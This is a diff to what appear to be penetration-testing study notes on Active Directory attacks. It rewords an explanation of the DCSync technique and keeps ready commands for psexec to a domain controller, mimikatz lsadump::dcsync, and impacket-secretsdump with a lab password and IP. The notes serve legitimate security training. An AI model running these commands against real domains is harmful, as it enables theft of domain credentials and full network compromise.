@@ -363,11 +363,11 @@ misc::cmd(launch a new command prompt)
 psexec.exe \\dc01 cmd.exe
 ```
 #### Domain Controller Synchronization
-Require Administrator account
+>If we obtain access to a user account in one of these groups or with these rights assigned, we can perform a dcsync4 attack in which we impersonate a domain controller. This allows us to request any user credentials from the domain.
+
+>to perform this attack, we need a user that is a member of Domain Admins, Enterprise Admins, or Administrators, because there are certain rights required to start the replication. Alternatively, we can leverage a user with these rights assigned, though we're far less likely to encounter one of these in a real penetration test.
 ```
 lsadump::dcsync /user:Administrator
 lsadump::dcsync /user:corp\Administrator
 kali: impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
 ```
->to perform this attack, we need a user that is a member of Domain Admins, Enterprise Admins, or Administrators, because there are certain rights required to start the replication. Alternatively, we can leverage a user with these rights assigned, though we're far less likely to encounter one of these in a real penetration test.
-
